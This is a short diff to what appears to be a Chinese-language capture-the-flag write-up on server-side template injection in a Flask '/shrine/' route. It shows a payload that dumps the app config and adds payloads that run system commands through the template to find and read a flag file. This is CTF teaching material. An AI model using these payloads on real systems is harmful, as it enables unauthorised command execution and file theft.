@@ -31,5 +31,12 @@ SSTI注入尝试：对于@app.route\('/shrine/'\)，使用
 /shrine/{{url_for.__globals__['current_app'].config}}  //查看当前app下的config
 ```
 
+Payload：
+
+```
+{{system('find / -name flag')}}    //查找名为flag的文件
+{{system('cat /flag')}}   //获取根目录下名为flag的文件
+```
+
 
 
